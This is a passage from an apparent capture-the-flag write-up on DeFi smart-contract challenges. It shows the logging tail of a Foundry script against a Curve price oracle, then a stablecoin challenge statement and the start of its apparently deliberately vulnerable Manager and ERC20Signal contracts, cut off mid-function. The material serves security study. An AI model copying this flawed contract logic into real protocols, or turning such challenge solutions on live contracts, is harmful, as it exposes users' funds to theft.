</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"LP balance of Player : "</span><span>, curvePool.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset0 balance : "</span><span>, assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"asset1 balance : "</span><span>, assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(player));
</span><span>
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"oracle asset0 balance : "</span><span>, assetToken0.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle)));
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"oracle asset1 balance : "</span><span>, assetToken1.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#0086b3>address</span><span>(oracle)));
</span><span>        
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Curve asset1 Price : "</span><span>, curvePriceOracle.</span><span style=color:#62a35c>getAssetPrice</span><span>(1)); </span><span style=color:#969896;font-style:italic>// TARGET = 1200000000000000000
</span><span>        console.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Curve SpotPrice : "</span><span>, curvePriceOracle.</span><span style=color:#62a35c>getSpotPrice</span><span>());
</span><span>
</span><span>        vm.</span><span style=color:#62a35c>stopBroadcast</span><span>();
</span><span>
</span><span>    }
</span><span>}
</span></code></pre></div></div><hr><h1 id=stablecoin>Stablecoin</h1><p>P : """ There is a new algorithmic stablecoin backed by ETH!<p>Manager owner executes the following code:<p>manager.addCollateralToken(IERC20(address(ETH)), new PriceFeed(), 20_000_000_000_000_000 ether, 1 ether);<p>ETH.mint(address(this), 2 ether); ETH.approve(address(manager), type(uint256).max); manager.manage(ETH, 2 ether, true, 3395 ether, true);<p>(, ERC20Signal debtToken,,,) = manager.collateralData(IERC20(address(ETH))); manager.updateSignal(debtToken, 3520 ether); You are given 6000 of ETH. Your goal is to get 50_000_000 of MIM. """<div class=note-container><button class=note-toggle><div class=note-icon><p>StableCoin.sol</div></button><div class=note-content style=display:none><pre class=language-solidity data-lang=solidity style=color:#323232;background-color:#fff><code class=language-solidity data-lang=solidity><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: UNLICENSED
</span><span style=color:#a71d5d;font-weight:700>pragma solidity ^</span><span style=color:#0086b3>0.8.0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>ERC20</span><span>} from "@openzeppelin/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/</span><span style=color:#0086b3>ERC20</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC20</span><span>} from "@openzeppelin/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/</span><span style=color:#0086b3>IERC20</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {</span><span style=color:#0086b3>IERC20Metadata</span><span>} from "@openzeppelin/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/extensions/</span><span style=color:#0086b3>IERC20Metadata</span><span>.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {SafeERC20} from "@openzeppelin/contracts/token/</span><span style=color:#0086b3>ERC20</span><span>/utils/SafeERC20.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
</span><span style=color:#a71d5d;font-weight:700>import</span><span> {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
</span><span>
</span><span style=color:#a71d5d;font-weight:700>library </span><span style=color:#62a35c>ProtocolMath </span><span>{
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> ONE </span><span style=color:#a71d5d;font-weight:700>=</span><span> 1e18;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>internal constant</span><span> MINUTES_1000_YEARS </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>525_600_000</span><span>;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mulDown</span><span>(</span><span style=color:#0086b3>uint256 </span><span>a, </span><span style=color:#0086b3>uint256 </span><span>b) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(a </span><span style=color:#a71d5d;font-weight:700>*</span><span> b) </span><span style=color:#a71d5d;font-weight:700>/</span><span> ONE;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>divDown</span><span>(</span><span style=color:#0086b3>uint256 </span><span>a, </span><span style=color:#0086b3>uint256 </span><span>b) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(a </span><span style=color:#a71d5d;font-weight:700>*</span><span> ONE) </span><span style=color:#a71d5d;font-weight:700>/</span><span> b;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>divUp</span><span>(</span><span style=color:#0086b3>uint256 </span><span>a, </span><span style=color:#0086b3>uint256 </span><span>b) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(a </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span> 0;
</span><span>        } </span><span style=color:#a71d5d;font-weight:700>else </span><span>{
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return </span><span>(((a </span><span style=color:#a71d5d;font-weight:700>*</span><span> ONE) </span><span style=color:#a71d5d;font-weight:700>-</span><span> 1) </span><span style=color:#a71d5d;font-weight:700>/</span><span> b) </span><span style=color:#a71d5d;font-weight:700>+</span><span> 1;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_decMul</span><span>(</span><span style=color:#0086b3>uint256 </span><span>x, </span><span style=color:#0086b3>uint256 </span><span>y) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span> decProd) {
</span><span>        decProd </span><span style=color:#a71d5d;font-weight:700>= </span><span>(x </span><span style=color:#a71d5d;font-weight:700>*</span><span> y </span><span style=color:#a71d5d;font-weight:700>+</span><span> ONE </span><span style=color:#a71d5d;font-weight:700>/</span><span> 2) </span><span style=color:#a71d5d;font-weight:700>/</span><span> ONE;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_decPow</span><span>(</span><span style=color:#0086b3>uint256 </span><span>base, </span><span style=color:#0086b3>uint256 </span><span>exponent) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(exponent </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>return</span><span> ONE;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> y </span><span style=color:#a71d5d;font-weight:700>=</span><span> ONE;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> x </span><span style=color:#a71d5d;font-weight:700>=</span><span> base;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> n </span><span style=color:#a71d5d;font-weight:700>=</span><span> Math.</span><span style=color:#62a35c>min</span><span>(exponent, MINUTES_1000_YEARS);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>while </span><span>(n </span><span style=color:#a71d5d;font-weight:700>></span><span> 1) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(n </span><span style=color:#a71d5d;font-weight:700>%</span><span> 2 != 0) {
</span><span>                y </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_decMul</span><span>(x, y);
</span><span>            }
</span><span>            x </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>_decMul</span><span>(x, x);
</span><span>            n </span><span style=color:#a71d5d;font-weight:700>/=</span><span> 2;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#62a35c>_decMul</span><span>(x, y);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_computeHealth</span><span>(</span><span style=color:#0086b3>uint256 </span><span>collateral, </span><span style=color:#0086b3>uint256 </span><span>debt, </span><span style=color:#0086b3>uint256 </span><span>price) </span><span style=color:#a71d5d;font-weight:700>internal pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return</span><span> debt </span><span style=color:#a71d5d;font-weight:700>></span><span> 0 </span><span style=color:#a71d5d;font-weight:700>?</span><span> collateral </span><span style=color:#a71d5d;font-weight:700>*</span><span> price </span><span style=color:#a71d5d;font-weight:700>/</span><span> debt </span><span style=color:#a71d5d;font-weight:700>: type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max</span><span>;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>abstract contract </span><span style=color:#62a35c>ManagerAccess </span><span>{
</span><span>    </span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>public immutable</span><span> manager;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>Unauthorized</span><span>(</span><span style=color:#0086b3>address </span><span>caller);
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>modifier </span><span style=color:#62a35c>onlyManager</span><span>() {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender !=</span><span> manager) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>Unauthorized</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>_;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_manager) {
</span><span>        manager </span><span style=color:#a71d5d;font-weight:700>=</span><span> _manager;
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>PriceFeed </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>fetchPrice</span><span>() </span><span style=color:#a71d5d;font-weight:700>external pure returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>(</span><span style=color:#0086b3>2207 ether</span><span>, </span><span style=color:#0086b3>0.01 ether</span><span>);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Token </span><span style=color:#a71d5d;font-weight:700>is ERC20</span><span>, </span><span style=color:#62a35c>ManagerAccess </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_manager, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_id) </span><span style=color:#62a35c>ERC20</span><span>(_id, _id) </span><span style=color:#62a35c>ManagerAccess</span><span>(_manager) {}
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(to, amount);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(</span><span style=color:#0086b3>address </span><span>from, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>        </span><span style=color:#62a35c>_burn</span><span>(from, amount);
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>ERC20Signal </span><span style=color:#a71d5d;font-weight:700>is ERC20</span><span>, </span><span style=color:#62a35c>ManagerAccess </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>using </span><span>ProtocolMath </span><span style=color:#a71d5d;font-weight:700>for </span><span style=color:#0086b3>uint256</span><span>;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public</span><span> signal;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>(</span><span style=color:#0086b3>address </span><span>_manager, </span><span style=color:#0086b3>uint256 </span><span>_signal, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_name, </span><span style=color:#0086b3>string </span><span style=color:#a71d5d;font-weight:700>memory </span><span>_symbol)
</span><span>        </span><span style=color:#62a35c>ERC20</span><span>(_name, _symbol)
</span><span>        </span><span style=color:#62a35c>ManagerAccess</span><span>(_manager)
</span><span>    {
</span><span>        signal </span><span style=color:#a71d5d;font-weight:700>=</span><span> _signal;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>mint</span><span>(</span><span style=color:#0086b3>address </span><span>to, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>        </span><span style=color:#62a35c>_mint</span><span>(to, amount.</span><span style=color:#62a35c>divUp</span><span>(signal));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(</span><span style=color:#0086b3>address </span><span>from, </span><span style=color:#0086b3>uint256 </span><span>amount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>        </span><span style=color:#62a35c>_burn</span><span>(from, amount </span><span style=color:#a71d5d;font-weight:700>== type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max ? </span><span style=color:#0086b3>ERC20</span><span>.</span><span style=color:#62a35c>balanceOf</span><span>(from) </span><span style=color:#a71d5d;font-weight:700>:</span><span> amount.</span><span style=color:#62a35c>divUp</span><span>(signal));
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>setSignal</span><span>(</span><span style=color:#0086b3>uint256 </span><span>backingAmount) </span><span style=color:#a71d5d;font-weight:700>external onlyManager </span><span>{
</span><span>        </span><span style=color:#0086b3>uint256</span><span> supply </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>ERC20</span><span>.</span><span style=color:#62a35c>totalSupply</span><span>();
</span><span>        </span><span style=color:#0086b3>uint256</span><span> newSignal </span><span style=color:#a71d5d;font-weight:700>= </span><span>(backingAmount </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 </span><span style=color:#a71d5d;font-weight:700>&&</span><span> supply </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) </span><span style=color:#a71d5d;font-weight:700>?</span><span> ProtocolMath.ONE </span><span style=color:#a71d5d;font-weight:700>:</span><span> backingAmount.</span><span style=color:#62a35c>divUp</span><span>(supply);
</span><span>        signal </span><span style=color:#a71d5d;font-weight:700>=</span><span> newSignal;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>totalSupply</span><span>() </span><span style=color:#a71d5d;font-weight:700>public view override returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>ERC20</span><span>.</span><span style=color:#62a35c>totalSupply</span><span>().</span><span style=color:#62a35c>mulDown</span><span>(signal);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>balanceOf</span><span>(</span><span style=color:#0086b3>address </span><span>account) </span><span style=color:#a71d5d;font-weight:700>public view override returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>ERC20</span><span>.</span><span style=color:#62a35c>balanceOf</span><span>(account).</span><span style=color:#62a35c>mulDown</span><span>(signal);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transfer</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public pure override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>allowance</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>address</span><span>) </span><span style=color:#a71d5d;font-weight:700>public view virtual override returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>approve</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public virtual override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>transferFrom</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public virtual override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>increaseAllowance</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public virtual override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>decreaseAllowance</span><span>(</span><span style=color:#0086b3>address</span><span>, </span><span style=color:#0086b3>uint256</span><span>) </span><span style=color:#a71d5d;font-weight:700>public virtual override returns </span><span>(</span><span style=color:#0086b3>bool</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>revert</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>contract </span><span style=color:#62a35c>Manager </span><span style=color:#a71d5d;font-weight:700>is </span><span style=color:#62a35c>Ownable </span><span>{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>using </span><span>SafeERC20 </span><span style=color:#a71d5d;font-weight:700>for IERC20</span><span>;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>using </span><span>ProtocolMath </span><span style=color:#a71d5d;font-weight:700>for </span><span style=color:#0086b3>uint256</span><span>;
</span><span>
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> MIN_DEBT </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>3000e18</span><span>;
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> MIN_CR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>130 </span><span style=color:#a71d5d;font-weight:700>*</span><span> ProtocolMath.ONE </span><span style=color:#a71d5d;font-weight:700>/ </span><span style=color:#0086b3>100</span><span>; </span><span style=color:#969896;font-style:italic>// 130%
</span><span>    </span><span style=color:#0086b3>uint256 </span><span style=color:#a71d5d;font-weight:700>public constant</span><span> DECAY_FACTOR </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>999_027_758_833_783_000</span><span>;
</span><span>
</span><span>    Token </span><span style=color:#a71d5d;font-weight:700>public immutable </span><span>mim;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#0086b3>address </span><span style=color:#a71d5d;font-weight:700>=> IERC20</span><span>) </span><span style=color:#a71d5d;font-weight:700>public</span><span> positionCollateral;
</span><span>    </span><span style=color:#a71d5d;font-weight:700>mapping</span><span>(</span><span style=color:#a71d5d;font-weight:700>IERC20 => </span><span>Collateral) </span><span style=color:#a71d5d;font-weight:700>public</span><span> collateralData;
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>struct </span><span style=color:#62a35c>Collateral </span><span>{
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolCollateralToken;
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolDebtToken;
</span><span>        PriceFeed priceFeed;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> operationTime;
</span><span>        </span><span style=color:#0086b3>uint256</span><span> baseRate;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>NothingToLiquidate</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>CannotLiquidateLastPosition</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>RedemptionSpreadOutOfRange</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>NoCollateralOrDebtChange</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>InvalidPosition</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>NewICRLowerThanMCR</span><span>(</span><span style=color:#0086b3>uint256 </span><span>newICR);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>NetDebtBelowMinimum</span><span>(</span><span style=color:#0086b3>uint256 </span><span>netDebt);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>FeeExceedsMaxFee</span><span>(</span><span style=color:#0086b3>uint256 </span><span>fee, </span><span style=color:#0086b3>uint256</span><span> amount, </span><span style=color:#0086b3>uint256</span><span> maxFeePercentage);
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>PositionCollateralTokenMismatch</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>CollateralTokenAlreadyAdded</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>CollateralTokenNotAdded</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>SplitLiquidationCollateralCannotBeZero</span><span>();
</span><span>    </span><span style=color:#a71d5d;font-weight:700>error </span><span style=color:#62a35c>WrongCollateralParamsForFullRepayment</span><span>();
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>constructor</span><span>() {
</span><span>        mim </span><span style=color:#a71d5d;font-weight:700>= new </span><span style=color:#62a35c>Token</span><span>(</span><span style=color:#0086b3>address</span><span>(</span><span style=color:#a71d5d;font-weight:700>this</span><span>), </span><span style=color:#183691>"MIM"</span><span>);
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>manage</span><span>(
</span><span>        </span><span style=color:#a71d5d;font-weight:700>IERC20 </span><span>token,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>collateralDelta,
</span><span>        </span><span style=color:#0086b3>bool </span><span>collateralIncrease,
</span><span>        </span><span style=color:#0086b3>uint256 </span><span>debtDelta,
</span><span>        </span><span style=color:#0086b3>bool </span><span>debtIncrease
</span><span>    ) </span><span style=color:#a71d5d;font-weight:700>external returns </span><span>(</span><span style=color:#0086b3>uint256</span><span>, </span><span style=color:#0086b3>uint256</span><span>) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#0086b3>address</span><span>(collateralData[token].protocolCollateralToken) </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>address</span><span>(0)) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>CollateralTokenNotAdded</span><span>();
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(positionCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>!= </span><span style=color:#0086b3>IERC20</span><span>(</span><span style=color:#0086b3>address</span><span>(0)) </span><span style=color:#a71d5d;font-weight:700>&&</span><span> positionCollateral[msg.sender] </span><span style=color:#a71d5d;font-weight:700>!=</span><span> token) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>PositionCollateralTokenMismatch</span><span>();
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralDelta </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0 && debtDelta == 0) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>NoCollateralOrDebtChange</span><span>();
</span><span>        }
</span><span>
</span><span>        Collateral </span><span style=color:#a71d5d;font-weight:700>memory </span><span>collateralTokenInfo </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralData[token];
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolCollateralToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralTokenInfo.protocolCollateralToken;
</span><span>        </span><span style=color:#0086b3>ERC20Signal</span><span> protocolDebtToken </span><span style=color:#a71d5d;font-weight:700>=</span><span> collateralTokenInfo.protocolDebtToken;
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> debtBefore </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(</span><span style=color:#a71d5d;font-weight:700>!</span><span>debtIncrease </span><span style=color:#a71d5d;font-weight:700>&& </span><span>(debtDelta </span><span style=color:#a71d5d;font-weight:700>== type</span><span>(</span><span style=color:#0086b3>uint256</span><span>).</span><span style=color:#a71d5d;font-weight:700>max || </span><span>(debtBefore </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0 && debtDelta == debtBefore))) {
</span><span>            </span><span style=color:#a71d5d;font-weight:700>if </span><span>(collateralDelta </span><span style=color:#a71d5d;font-weight:700>!=</span><span> 0 || collateralIncrease) {
</span><span>                </span><span style=color:#a71d5d;font-weight:700>revert </span><span style=color:#62a35c>WrongCollateralParamsForFullRepayment</span><span>();
</span><span>            }
</span><span>            collateralDelta </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>            debtDelta </span><span style=color:#a71d5d;font-weight:700>=</span><span> debtBefore;
</span><span>        }
</span><span>
</span><span>        </span><span style=color:#62a35c>_updateDebt</span><span>(token, protocolDebtToken, debtDelta, debtIncrease);
</span><span>        </span><span style=color:#62a35c>_updateCollateral</span><span>(token, protocolCollateralToken, collateralDelta, collateralIncrease);
</span><span>
</span><span>        </span><span style=color:#0086b3>uint256</span><span> debt </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolDebtToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>        </span><span style=color:#0086b3>uint256</span><span> collateral </span><span style=color:#a71d5d;font-weight:700>=</span><span> protocolCollateralToken.</span><span style=color:#62a35c>balanceOf</span><span>(</span><span style=color:#a71d5d;font-weight:700>msg</span><span>.</span><span style=color:#a71d5d;font-weight:700>sender</span><span>);
</span><span>
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(debt </span><span style=color:#a71d5d;font-weight:700>==</span><span> 0) {
